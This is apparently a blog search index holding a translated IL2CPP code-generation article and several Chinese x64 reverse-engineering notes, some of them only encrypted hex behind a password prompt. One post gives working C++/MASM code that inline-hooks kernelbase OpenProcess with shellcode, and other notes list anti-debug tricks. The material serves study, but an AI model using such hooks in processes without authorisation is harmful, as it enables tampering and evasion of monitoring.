静态变量我们已经了解了实例变量（Vector3）如何运作，现在让我们来看看托管代码中的静态变量是如何转换成C++代码并使用的。让我们找到HelloWorld_Start_m3函数，这个函数应该在Bulk_Assembly-CSharp_0.cpp文件中。从这个函数我们找到一个叫Important_t1的类型（这个类型应该是在U2DCSharp_HelloWorld_Important.h头文件里） 12345678910struct Important_t1 : public Object_t{// System.Int32 HelloWorld/Important::InstanceIdentifierint32_t ___InstanceIdentifier_1;};struct Important_t1_StaticFields{// System.Int32 HelloWorld/Important::ClassIdentifierint32_t ___ClassIdentifier_0;}; 大伙儿可能注意到了，il2cpp.exe将生成的C++代码分成了两个结构，一个结构负责普通的成员变量，另一个结构负责静态成员。因为静态成员是所有实例共享的数据，因此在运行的时候，Important_t1_StaticFields只有一份。所有的Important_t1实例都共享这个数据。在生成的代码中，通过下面的代码来获取静态数据： 1int32_t L_1 = (((Important_t1_StaticFields*)InitializedTypeInfo(&amp;Important_t1_il2cpp_TypeInfo)-&gt;static_fields)-&gt;___ClassIdentifier_0); 在Important_t1的元信息结构中有一个指向Important_t1_StaticFields结构的指针（static_fields），然后通过类型转换再取出需要的值（___ClassIdentifier_0） 异常在托管代码中的异常会被il2cpp.exe转换成C++的异常。我们再一次的选择了这个策略还是出于可移植性的考虑：去掉和平台相关的方案。当il2cpp.exe需要转换生成一个托管的异常的时候，它会调用il2cpp_codegen_raise_exception函数。 在我们的例子中，生成的C++异常处理代码如下： 123456789101112131415161718192021222324try{ // begin try (depth: 1) InvalidOperationException_t7 * L_17 = (InvalidOperationException_t7 *)il2cpp_codegen_object_new (InitializedTypeInfo(&amp;InvalidOperationException_t7_il2cpp_TypeInfo)); InvalidOperationException__ctor_m8(L_17, (String_t*) &amp;_stringLiteral5, /*hidden argument*/&amp;InvalidOperationException__ctor_m8_MethodInfo); il2cpp_codegen_raise_exception(L_17); // IL_0092: leave IL_00a8 goto IL_00a8;} // end try (depth: 1)catch(Il2CppExceptionWrapper&amp; e){ __exception_local = (Exception_t8 *)e.ex; if(il2cpp_codegen_class_is_assignable_from (&amp;InvalidOperationException_t7_il2cpp_TypeInfo, e.ex-&gt;object.klass)) goto IL_0097; throw e;}IL_0097:{ // begin catch(System.InvalidOperationException) V_1 = ((InvalidOperationException_t7 *)__exception_local); NullCheck(V_1); String_t* L_18 = (String_t*)VirtFuncInvoker0&lt; String_t* &gt;::Invoke(&amp;Exception_get_Message_m9_MethodInfo, V_1); Debug_Log_m6(NULL /*static, unused*/, L_18, /*hidden argument*/&amp;Debug_Log_m6_MethodInfo); // IL_00a3: leave IL_00a8 goto IL_00a8;} // end catch (depth: 1) 所有的托管异常都被封装进了il2CppExceptionWrapper的C++类型。当C++代码捕获了这种异常之后，会试图将包解开获得托管异常（Exception_t8）。就这个例子而言，我们期待的是一个InvalidOperationException异常，所以当我们发现抛出的异常不是这个类型的时候，代码会创建一个C++异常的拷贝并重新抛出。反之如果异常正是我们所关注的，代码就会跳到异常处理的那段。 Goto是个什么鬼？跳转语句！？！这段代码有一个有意思的地方：大伙儿发现了labels标签和goto语句没有？这些不太使用的东西居然出现在了结构化的代码中（译注：主流观点都不建议使用labels和goto语句，因为这会破坏程序的结构化导致各种bug的产生）。为什么会这样？因为IL！IL是没有诸如for，while循环和if/then判断结构化概念的低等级的语言。因为il2cpp.exe需要处理IL代码，因此也会出现goto语句。 还是看例子，让我们看看HelloWorld_Start_m3函数中的循环是个啥样子的： 123456789101112131415161718192021222324252627IL_00a8:{ V_2 = 0; goto IL_00cc;}IL_00af:{ ObjectU5BU5D_t4* L_19 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 1)); int32_t L_20 = V_2; Object_t * L_21 = Box(InitializedTypeInfo(&amp;Int32_t5_il2cpp_TypeInfo), &amp;L_20); NullCheck(L_19); IL2CPP_ARRAY_BOUNDS_CHECK(L_19, 0); ArrayElementTypeCheck (L_19, L_21); *((Object_t **)(Object_t **)SZArrayLdElema(L_19, 0)) = (Object_t *)L_21; Debug_LogFormat_m7(NULL /*static, unused*/, (String_t*) &amp;_stringLiteral6, L_19, /*hidden argument*/&amp;Debug_LogFormat_m7_MethodInfo); V_2 = ((int32_t)(V_2+1));}IL_00cc:{ if ((((int32_t)V_2) &lt; ((int32_t)3))) { goto IL_00af; }} 在这里变量V_2是循环的索引，从0开始，在循环代码的最后进行累加。 1V_2 = ((int32_t)(V_2+1)); 循环的结束检查代码： 1if ((((int32_t)V_2) &lt; ((int32_t)3))) 只要V_2小于3，goto语句就会跳转到IL_00af标签处，也就是循环的一开始继续执行。你可能会想：嗯。。il2cpp.exe一定在偷懒，直接使用了IL的代码而不是使用抽象的语法分析树。如果你是这么想的，那么恭喜你猜对了。。。 你可能还会注意到在上面的这段运行时检查的代码中，有下面的情况： 12float L_1 = (__this-&gt;___x_1);float L_2 = L_1; 很显然， 变量L_2不是必须的，大多数的C++编译器会将其优化掉。对于我们来说，我们在想办法不去生成这行代码（译注：因为il2cpp.exe是从IL进行代码的转换，没有使用高级的语法分析，所以会产生多余的代码）。我们也在研究使用高级的抽象语法树（Abstract Syntax Tree，缩写：AST）以便更好的理解IL代码从而产生更好的C++代码（译注：可能以后就会去除goto跳转语句了） 总结总结通过一个简单的项目，我们初窥了IL2CPP如何将托管代码转换成C++代码。如果你没有生成测试项目，我强烈建议你做一遍并进行一些研究。在你做这件事的同时，请记住，在后续Unity的版本中，生成的C++代码可能会和本文有所不同。这是正常的，因为我们在不断的改进和优化IL2CPP。 通过将IL代码转换成C++，我们能够获得在可移植和性能上的一个很好的平衡。我们能拥有高效开发的托管代码的同时，还能获得高质量的C++代码。 在接下来的文章中，我们将探索更多的C++代码，包括函数调用，函数对原生库的封装和共享等。下篇文章我们将会围绕iOS 64-bit和Xcode展开。","link":"/2021/11/04/il2cpp/2%20.%20%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E4%B9%8B%E6%97%85/"},{"title":"x64（学习笔记） - 10(异常1)","text":"嗨，请准确无误地输入密码查看哟！ 289f71be50683e8477adef2014d66fe922e80b0f537543098ab1d2ac817bd030ff0f44a33e55a94a4d9444bbec69dfc3fe5c0b12fcacfcefd782b31c75be1b7c651dae9f000c949ff841a14007d223337fdd53babf3688d6e86639c4940cecf43ee3f45422b6c0c36cb285b26b741a50842d285f3147cf36ab1de8ccfab819cea067445723a0c8b9e2c064140a0181313e4bdb2f34ff69b7cf179460b097aa6c16726d6d6d3550cc5c14e58895f09371e3b2dd4e58739fec59b52b4d02b81805809dac285e32474abccfc01bdf75d8d981e1fdce89bada0536048efe6ccc911c92435ca3e359456d6336ad4e9ac938ad99cf0b88f3c26b97a85c44e4a0b62179703d08b77f46eaf2d5391895383624e5f2b98ba5fe0201bd32998d6bf11eb1eb3c21b3d781bccf29dd5b2ddb667602c544f6c9e0c946b0441a858d94413aeca3f5e7110c0b78a9220c6db01d6ac5e12b32648821ebf74ee4fdb669f5317e31742bb54de77bebd46b1a195e6121a30d1a180125ff5296f95b2eec9f300e28cb17186319aa9e56df9d407d1d4c791fc8ee00b2a16b6ad654293062eacd78213235610e718c87ea31b149875e3686d6a8eda057c9d0cc48c8fed3765e0e1b111e781b598964ada0ae794f2ca08fcc78d0c25b0fc3c89c52537c19fdf08adb523f0ba33e90803f7e66ec05c6090f0ceafcbb8a78c11f6811ef467921c73daf35b55f1fb9d3fce2c0a96684b51b04b6fa3b0238389c662e97a47d3eef5d7ccd7f71266dbd7a73d4183eef2130c6af270b84ff6b553350e1a8d9c52ed2df68790bb8b37f50d4070bb9f58683307438ff2bdfbf181344fa230d7f7691f0ddad86b7c6df56efe67664887322a5163b4d005461652816cf5159ee5d9bd50d2fb680dc87c72ae23f79003e7b4a542ec6cc5d95af2bafdf1883dd577d0eb4933f62452e3a174421f362245f19ea388e5ec8e7a3f413b22cbc69c6b1dd33c54a427dd9b43be51f1f39bd3ef378bf15c61b1201c52ade78ab6353d80bd54f8863db9ceaaf38098f1e936c9d38099ab35838f09aa1a5fc12578ed48f6521572d08a9fe9c87ba5c129ec5ec888d56564d28860fe99afae456cf9b102a59ac2de21fce89d19e0262a0f3502c8c435e53c79d245f6da52312","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B81)/"},{"title":"x64（学习笔记） - 10(异常2)","text":"嗨，请准确无误地输入密码查看哟！ 62112dfd54028f379e10a0319ea6555055d8ffa54e80d5848f0b11971e3b1e6cccb52302b69f4a8a7657bd652ae2f2a3778fe18ef5d00c500159c761a80abdc7ca4bbbe12bbce4cf25e141ab95d06165238ad8a4bd3e78ea9e5f37eee118a28165e63d2b3a2a8ec06fbb30b9d40c567ec7d673bb331f840a0edf6f51cd6863b0d8682db16d2f9f04b9600ca0e3dbf3b3119570c89cedcd8255448f70ce001295673279cf0cedf800fb8dceba42d367bd17b86cd3aac67450de9abcaf27954becd03d536dca60851b213ebcfea99cc0964a8f23847cccfbcce1e1b72a101b4e218883dcf0bccd8a53c71da74c2ad844e68257bbe5b3d3bdf3fcadd3f620d20012c7d5a608e774fe34ff21b7e158ff4c8c0b21c406ab2ea66191feff2642b59f9f81b10ef8df87856ab69e4fedf0469fd0dbef85276d27bff485e73d8127d8ac84f2c6f797e9c3fe9a7d5bfc995ea37eaab0ad383c49e975762966208dee21c6c6617e6fa8dac0a80d2a9aa728f2abe8219becbd23cef8663275d0f25219cedfabbe3cc311f6ecc33c2ab6ddf646cdc35de3471597e8a0c66976ff9beca84b304c7f988357aec84b6584fc9231f2cfde12d8ef3d3ac568b2dfd28db888f4fd67985dc1639036d440d3f759af866d560de8c60267a933496da5395575fc0daed3b0d384bd2c3fa055e3a21db17ea0c8b9ab1f8c190a28e107130712bc8444b44356433018805fe185b74333367ea66f95ff0ea425227391a8c62dde5a0d76cf563c","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B82)/"},{"title":"x64（学习笔记） - 10(异常2)","text":"嗨，请准确无误地输入密码查看哟！ 40f6ac0bb6a9833e879b3d8a01d5930054fdabb808c585db3dfa6ac57580680251eb09fb5209e9efc446a39c06de46a21b2998d1b1e211300a94d44f014b9186b633cf0d0215ba0bc4d167edc36a7625f60740b3d927a6b5a56209296f2868c9e01eb18d7e9d891cc6650e8da9ae6dc81ca6de2c221fb1dd4bfdb47618939c081d30098d8c0510ca22ce40ea73effc20d312d81de69e6bb2919218e0dda768a1ee990bbaf0b4345c6fbc23f1a06d13f8b43dde31c4f8e582e2d69a4186c5c5dbc2a2e47e7ac02bacc936bc1f4d8077e039292fe73b781e8d6d4bf500ee73e2956f135a0d8d9f9f4a15cf3efec870c0ea7f7f2d7e2dad538da460873ab2a0bf35b29e9f18d5bd7a2f7f060b6c4b03068b0f4081a850052f6e1fd5f9fb92464b9f49bfcd0d4599474970f7152d75ca7230f0e636713d25e2712e67f9099ac0c2e65427d7ed89736939636d195b851e096a3f53f1c10f7286d4bb1b1c8a48a967a858832475da4a1f91e8f52786cbaef374720d314690a6eea2eec73bd4c4b4758db7f8f6717ff8ec4d6d0c8a863183f791f23938775f00e912d6462a0a08c9ae83d622dde12d3ceb3954b1c00dc7162ba39d56433a7780c3b1347a654cf1754e889136c09391c8a9396c82c68d32f9bbe183353e04202c616941be95c0d90df31b","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12(%E8%B0%83%E8%AF%95)/"},{"title":"x64（学习笔记） - 1(函数逆向)","text":"要点 在x64默认下不使用rbp寻址，使用rsp寻址 在x64下栈是静态的栈，函数开头会默认开辟好所有的栈 栈帧 - 栈顶 到 栈底的高度 x64中栈帧是静态的，默认就开辟好了 在x64中 修改rsp 可能是 sub 也可能是 lea 在x64中 堆栈回溯 需要计算rsp 来回溯堆栈 在x64中 ret 一般都没有参数 因为栈是静态默认开辟好的 48位有效地址有多少有效内存呢？2^48=40000G 物理地址有效内存 2^40=1024G 物理机的物理线有多少跟 64位下 E9 call 是模块 call 上下2G范围 64位下 跨大地址调用 1234push rax; 1个字节mov rax,0x123456789; 10个字节push rax; 1个字节ret; 1个字节 123push rax; 1个字节mov rax,0x123456789; 10个字节jmp rax; 2个字节 因为会破坏寄存器所以到目标地址后需要pop rax; FF 25(FF 15) 绝对调 jmp + 绝对地址 FF 25 00 00 00 00 XX XX XX XX XX XX XX XX （14个字节) 在头部（尾部）挂hook需要6个字节就够了 注意 在写代码的时候，尽量少直接传递结构体（浪费性能，会多次复制结构） 反调试 回溯堆栈 看看来源 是不是自己模块的函数 伪造调用 调用完挂hook / veh 在修复","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2(%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91)/"},{"title":"x64（学习笔记） - 3(x64InlineHook)","text":"inlineHook 过程 选择hook方式 获取hook地址（如果是导入表的函数注意jmp） 计算hook掉的字节（汇编引擎 / 手动计算） 保存要被替换掉的汇编，计算被替换掉字节下一行的地址 构建hook shellcode shellCode替换掉目标地址的代码（为了不破坏原有寄存器，需要保存当前寄存器，火哥推荐的是 构建的shellcode 使用asm push所有寄存器 然后提升栈顶 调用自己的函数 恢复栈顶 然后pop） 构建调用原函数的 shell code， 执行被替换掉的汇编，然后jmp到之前存储的地址 要点 因为原有call都是相对偏移，如果hook call相关的 比较麻烦 不能直接hook 函数的地址 因为可能会有jmp跳转，直接调用的函数的地址 可能不是函数头是jmp需要使用GetModuleHandleA 然后再GetProcAddress 获取到函数地址 注意 在写代码的时候，尽量少直接传递结构体（浪费性能，会多次复制结构） 再使用 xx xx xx xx xx xx xx xx ff 25 f2 ff ff ff 这种构造调整的时候 需要注意 地址会被当成命令来执行 反调试 回溯堆栈 看看来源 是不是自己模块的函数 伪造调用 调用完挂hook / veh 在修复 代码InlineHookEngine.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &quot;InlineHookEngine.h&quot;#include &quot;LDasm.h&quot;typedef HANDLE(WINAPI* OpenProcessProc)( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId );EXTERN_C HANDLE Hook( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);EXTERN_C HANDLE NewOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId){ printf(&quot;-------------------------------------\\r\\n&quot;); return 0;}char* oldCode;uint32_t GetAsmLength(PVOID psrc){ ldasm_data ld = { 0 }; uint32_t len = ldasm(psrc, &amp;ld, is_x64); return len;}UINT GetFuncOffset(PVOID funcAddress,UINT needOffsetNum,UINT currentNum = 0){ PVOID newfuncAddress = (PVOID)((UINT64)funcAddress + currentNum); currentNum += GetAsmLength(newfuncAddress); if (currentNum &gt;= needOffsetNum) { return currentNum; } return GetFuncOffset(funcAddress, needOffsetNum,currentNum);} EXTERN_C int main(){ //1.获取hook位置 HMODULE hModule = GetModuleHandleA(&quot;kernelbase.dll&quot;); PVOID64 funAddress = GetProcAddress(hModule, &quot;OpenProcess&quot;); //2.计算hook掉的字节 UINT offset = GetFuncOffset(funAddress, 6); // LDasm //3.保存要被替换掉的汇编，计算被替换掉字节下一行的地址 oldCode = (char*)malloc(offset); memcpy(oldCode, funAddress, offset); ULONG64 originalFuncLastAddress = (ULONG64)funAddress + offset; //4.构建hook shell code //函数头部的hook 利用函数头部空白的字节来操作 需要判断函数头部空白字节是否有8个0x00 / 0x90 / 0xCC char shellCode[] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x25,0xF2,0xff,0xff,0xff }; *(PULONG64)&amp;shellCode = (ULONG64)Hook; //修改原函数 PVOID64 hookFunAddress = (PVOID64)((ULONG64)funAddress - 8); ULONG oldProtect; if (VirtualProtect(hookFunAddress, USN_PAGE_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) { memcpy(hookFunAddress, shellCode, sizeof(shellCode)); VirtualProtect(hookFunAddress, USN_PAGE_SIZE, oldProtect, &amp;oldProtect); } else { return 0; } //5.构建调回去的shell code char CallOrginalFuncShellCode[] = { 0xFF,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, }; PVOID CallOrginalFunc = VirtualAlloc(NULL, USN_PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(CallOrginalFunc, oldCode, offset); *(PULONG64)&amp;CallOrginalFuncShellCode[6] = originalFuncLastAddress; memcpy((PVOID)((ULONG64)CallOrginalFunc + offset), CallOrginalFuncShellCode, sizeof(CallOrginalFuncShellCode)); //6.测试调用 HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;句柄为 %llx\\r\\n&quot;, handle); auto OrginalFunc = (OpenProcessProc)CallOrginalFunc; handle = OrginalFunc(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;句柄为 %llx\\r\\n&quot;, handle); return 0;} hook.asm12345678910111213141516171819202122232425262728293031323334353637383940414243444546.codeNewOpenProcess proto;Hook proc push rax push rbx push rcx push rdx push rbp push rsp push rsi push rdi push r8 push r9 push r10 push r11 push r12 push r13 push r14 push r15 sub rsp,120h call NewOpenProcess add rsp,120h pop r15 pop r14 pop r13 pop r12 pop r11 pop r10 pop r9 pop r8 pop rdi pop rsi pop rsp pop rbp pop rdx pop rcx pop rbx ;pop rax add rsp,8 retHook endpend","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3(X64InlineHook)/"},{"title":"x64（学习笔记） - 4（x64保护模式）","text":"x64保护模式 GDT 灰色部分是无效的 设置了也不管用 64位调用门： 段 普通段（代码段/数据段） 8字节 系统段 16字节 要点 默认情况下Cpu是没有开启x64的 问：操作系统如何开始X64答：IA_32_EFER(C0000080)寄存器的设置 MSR 俩款CPU IA64 只有64位环境，不兼容32位环境 IA32 x64与x86指令功能，混合CPU 64位下 R3-&gt;R0 的syscall 默认会把SS改成0 这时候访问东西的时候会无效 它处理好之后才会改成正常的值 gdt中 会有俩个cs 1个给x32用的 1个给x64用的 FS x64系统上 描述的是 x86进程的TEB32 GS x64系统上 描述的是 x64进程的TEB64 x64系统上 R0下 FS没用 GS代表KPCR 注意 64位调用门不支持参数","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F)/"},{"title":"x64（学习笔记） - 5（x64保护模式 - 调用门）","text":"x86程序进x64调用门 123456789101112131415161718192021222324252627282930313233__declspec(naked) void callCate(){ //当进去这个函数时已经处于 64位环境 __asm { __emit 0x0f; __emit 0x01; __emit 0xf8;//swapgs __emit 0x0f; __emit 0x01; __emit 0xf8; //swapgs __emit 0x48; __emit 0xcb; //retfq retfq; }}int main(){ char buf[6] = {0,0,0,0,0x73,0}; //手动构建 gdt __asm { call fword ptr buf; }} x64程序进x64调用门 构建GDT 构建命令 1234567891011121314.codecallCate proc nop call fword ptr [rcx] retcallCate endp;exeCallCate proc swapgs int 3 swapgs retfq; retfq 按照8字节返回 retf按照4字节返回exeCallCate endp;end KTSS64 64位下 GDT中xxxx8bxx`xxxxxxx xxxxxxxx`xxxxxxx 是tss 反调试 从32位下执行64位代码 从64位下执行32位代码","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E8%B0%83%E7%94%A8%E9%97%A8)/"},{"title":"x64（学习笔记） - 6（x64保护模式 - 内存映射）","text":"嗨，请准确无误地输入密码查看哟！ 0afe9fc8d166d58c7a0f08614e18834236e8645514f04529980f51c2022f9c5eed7676681bb0d070f818d12a19382e0a76d27810c31d8f270565ab8e3e4c22b0bb4888ee0837055e2bf9ad2a8571cfa17dd5f45b924ed485deea2f919ddc1866c7f10fcd562de4717a5f447facffe6cb338bc7491ae97fe44d341651ea9841a4f553fa157779ea85772fb0d13cc924fa254c8b11b4e794289c32ee854fcbe6d45121471957f353f8b21d245b11af9bece943f4e45cb0e012e5045c615c58a8284e75f20174ab7fa61467f3c3da4226851ac67098a88b5a04298af1a7c7c7c18a9a75881231709638a17a687ab688ecc9788e8f6f22ab81bde6a8b45e51f18f3f24aa20c122e250dbd4a1e7ef348221ef29c620bc9665e5f05ddf401bb1393c410e6cab052a1e6d2d338153f1fa9dda39262667b72d487b2c13acf18918dcb021c1fa8583b29daf974c1261c5a0620ad57185620314bac996eb121198541048623b62f85b77b0d1f56761513f83bc26edaae6b6f61b2515dcec6509586e13ff8e59f90a5ea51bdd1e81875718a6ae13885c7e8e24784be7f9a661c6f03bf96774f71204dca3d97649895c6fb8eb3315fff8fd5b7133a87cc13a552ee96e74e8c29789b898d0149c6ca264eadc7fd0b55767ddb0f047016c28376ea967407ff9fff283faa2c084baec797324b2586aa47d5308d92fafd8397496a588d183af99e48994d96646db6a9514ee6e79931b9986698549644a2893900231333aa6043c7dce7a328c04a84cc06ae2ef10b602904b7cf516bfd0d2f0bb0ed9364ca41d13331634ded03e1cc9fb66f0b4f2676a1b00270a1e80cfc5d2bd9f3b81634974ff6c7a2091ed921ce4f7d0e4707e18006ffac099d61450192fad92cac47a7fba85be35a4db565c44d6fd23b320f8af7cd325db102b529d2c4543d6da096f9986adde033bbb6813a526c9d873b714e163493a1eec177043f749b41890c83396c1661ba978dba1ebc7c5cb7ee6bc8be77bb5ae49e229c53d7347067255cd142dc0671a08bb971894d385b7e25b8b41c2f82c17fb420176783ccd5231ba100602703aaf327d715bf66c3f52e3cb985066f87a716036dcdec2002bfc0ad3c3f272915e3b323e732247db2337028b12dd62763f803744d70da9662952dbbf4055d61666cf03c134163e5b5612a376b1f737445b6acd74f3770a95e1aaa52783968b7d36dd480215a710926b4a52b2fd137072f2a31ebe755c91c632a8197ca8f38c0ad1d0b66150ac9b43df8a62e14eeba9d96d37ffe811a339a2d53ba9c2eafea1829e7d8c7feb9a462eb185ff7c53f0d5a595200affb61e61e9509270060e1aeb67d9549a40f0693ed63eb08fcc4c8b2860d72f314cece0ef3c87aeff35d2d17bb1a448fb8636907506fc3f8d8e46fd898fcda56fa117810883f8810ba0c5d8da64e9f120880b34804dcf27d837b568e4174b51742c3d7f83b92158af1ee7e4a0bb20988507254579444a6098bc98587d1ceac9a5455322b2e6361e14acb8dfc35630c5efa093f8f2bf06a8d1113d63af928b9eb1004ae5564de225c1f2d77fa3af6b4491a44dd4b6269e055adbc8b8f5428405361031bcd3ee3edb1405959c78c564e7870f03b7d956357837e368b7fbdf4c71ae4a4a1d896054d5cde6dc1602bfa3c5c2b0c0d50ca4f1d22b59b2ee0377e778f1eb694fa1a7ef1a98fde7165e42041f97c3de676a96cec006618baada5b471cfcecf695586b8f59af4d36441794f63dbc060f45be28785531aec1bf5b74df3ad0bdc8065a05c51df5e067561459fa29ffb35cfded0e93a319e315d384c587a81746acb238bf0b8d43c4b953ce29046981b595313deb30fb57b6e5b8b484237a4c6127ddf6a99a14eaa4455f93ce046c6926e77a708ccf75199ebf6f010fb8c632289d69cd5ddae8e4d59c8a875f14fe0512081e8ebcbd3b083953c4b07fbdf88ebe0e52cb778d7f1cf73e1153117f2dd16fbe525a01ce2205b1afefac8c3e737a7e0749a0911d1f32c3550720c1b2cfe7daf1db087e1acb007ed22b4e9735840ec862ff4f32c4e2cd3259f6c3740f7f032e58507ae38d5c48f07399033c8ca31c2257ce6e9b13e672eb617a732553de9860bfdddb859801120046b16812d5fa0e9b23e050b186481221bc4516e2d90a084c15c9913e7815791bd04b15ad915ec60399a7ed070e4d09253d86ff34c3a8be597edae0a38601f41e29a67451c986222a7c7aa09f5b05a9c2ef205cdc83e1253ace054bd564a2ee7e73a56a2eab14a494802bc81749048bbbd74c9a295f08fa070e3a7b642339f1c3d8173f8f35e06e97855839f4fefa259ca54957f337ccfbc3b61a81bedfec8250198898842a7ebe7d245ad58916885b8f0ba3bccfbfea505ded37545323d6e0ec35a4bed9efaff7f9df4d0906de6a0370418ec7ab2f62f2a5cc263c7fa332510a574ed473a95b85b4ca0e29899141d9722d96290696b9d6198d1801a127cb53c0605984484df4217fdeeadec1b8843c07fd2b6c2f526819bf79949bf7392a4f3ba3afb3dc695c0470794bee199c5df0594e4173c469ff16293cb830668f49204f6774d8ee428c35572525f884e4cd337272477d30230230dbaf6e37a8939d163579ca4c770804140037831d4048e253d04d7263c5e5e6f0db412d8ca11ac3a6b8071d83d08323c17f5b3133ad11abeaeba0ca4944fb5908cd57980907121a8382e298df474aa7f1e6e21ad793e6d36ffccfb9792b9c238d67fbfef63ead9d06765ff26f26e396df26e1014459a2b1008b868654e07afe451eb17a056cbf03b25df489e5c361592648b8b5f0ee967a5dd9d198f7bedbf903d574ed97bdf14a11c26c43c214977024b654703d68372939912cd87c942d049a26f1d4906206307df49ee2e54723b03e75372395d702d34d2f3dfd726060df37f8c50484c76c063547ed4fea8f28d607b01e4a8ee49bf4d5fa18de2bb5db1b970423a7e774b9eb858727e45b4816370c1a9932eb46eb08a8d89d54acdb7c9f8515b0b74f48815e9124088a2b02682f0bf05691748eba4034d8bd94f6ab0f3878e9b8a6bbf41b53f90a79fd7cf40cff1bb43b333d4bd93fa164cc6fa6b2bb40eb0f03be947b75620c1e02f19134052a0aae1a80852b0e01499c9d6690bdddeeda28c5790e94897606b7473acaf0a725b3fabc8d24bfbb56e7ea0296d2eb6e3ed56a15147a744156ccf1ec6e7c055b337ec58c8cef395aec62bf1c9dbe91f580e0af6b0043b573fb478d7ae2421c1e5efe17eea19ce0164bc58d466c7a18346bfb1de1e996eaf90a549f4d49988ebcbc56a02487b0005b205552f859b26a9eb5cc6d7797d2ca0201558b9ef52014b14976da9fca155f1b45d943f0c91141cda24eb2eb07a4bc593a56b99c232475bfaf787be23068144329734a8e4a4d10bc81c18a5652426cc766d6e6680153c83b67233df56881b21d5bd5679cafd3ee8ead1579a6e33228036ea4fdbd453819f3827b7cbe23d7fd1825d7f9adda98ca22d97d24735e49ca75dd9b3696509dc1681419012c98de20b6837437a8722ed1e105bc30bb4cdd88d992b09f94402d28e947c78a184303bee86b63862b2e3c53b265cee5c85a1cb777a8c714d9730c5a98e79a99225c9f7d510034ce65ca37a982698f814d205910fd440b5672e57d820f736e3cc9d7dffd81f6e1c3e3658e88e2e1c68b4f6bd678605b39cbf8294e05b8ed5a128d7bf13a3c20d7ee5c10c1b32ae334adb64d6f9877785caeb2d98dfbff73062c488722729390ebc1d16a401b605cadf04b149029103628a7b639c7295426c7245fbbf689e269da971f05295f89b251b3ba3caae809731872e95640412c4c04304ebf8716969f40467cabbdd53db8446ca0d2bea9697901fe2ee5477a29164a2d0117480f2b3084c3a396c43a0ce33be265931d89099a9f7e281f765e494e8ca8e6aa91e17c323b4585b827249dac3b54000cf1943319b4b395e33b25b1ed5467651f1d771105184bd7cbede5166bdefa8d46f4936d20b7dbd1a60c44bc57a88e9bb9e2311a9b2026007f26c670a2b4626091ac5a192202b8b8de2a83274224b8fd93acd0e7c5c9c4e3136cb09fad0274b39baceb777320926d6ec437bac9dcc62446c0b5505810d8e97fca171d44193a14d63a54b734004157e4fe7299c067cba0f0e427509049f559349fec7a39f432922dac7c564728de75397952b291f21a93ba289e79831903ec7097a4a09ad91531669fa0112e8d839fc6a6ac5b427c79bfcacabc2c34973b497e57d26d17fbd12d245cd948ad63d409e4d82d11b91a35f39fa057a099567425337d79eb1dffec1cd242e48a622bb302da71addaffb0d21e0da5f288de6c6d41439f5120b76ce43098b6ccecb7ae796360c79d3123cb90139ea694b0756e773c89c28097791ba9accf2a4b85cc78850f188da47afa7a8916fcde1c569adc567a9a3408327316324ca092c4866bf455b25322087391a53de28c2de905c38d25afa6ce1173df6d68b53190a05e3abe75707074bad124800a7e9283956d205563c7d8ee938e9a2f418dafa00566cd9fa7680f96f04d26d00d9f4d5c63bae0942942e2371b3565f5e314407f8c345281a6ca6f91a751f10a3f35b8c75c586b8b0710f9bd4b2383079a6a5201f8f580b27c418015fe006405e728174a981de633f6efff5d9e53621225e87e7dffd35f462492f5a525dfbee19520ee95678e6dc0f29178b22ad87ae40933a3ba89417313dad97e3cd4b0fdb30dc5eee56980c7ab952ad1880ef93187957ce8a9c2d780e523cef25404ea00aa3d8c574c8c246cc591aed7b699343522ef778735463c304989175fb7aa16e1b54587b050854cebe43d31d5048ec989e0ccd929149f6d6f67ce611177da4fd43af5b782a84233f2e41a48426a467ede67b833a85cb9ce4c31a6647a40b204708e968dce1074dda6e70a7741ba285876e9a6fabd844e2172d69e1ffd7cdc7414fa9e8681f635b1b6a2a704f08a7bc683e0964afae979a9d95a5c5a4ece1e9220e606df513935105e94b6719f851dcd392d8509a02ec22db56a4c96aeaab4985e5a42c081001741dddf95dd5249768f385d531f0e3a37794d608d330471c59d7073760f979c28ba5a24bd637e3290df7d3f7c5a88ba7442e24b688f79fdeeedaf113a6255950a5750311f87430240af81d61ba1d3ee6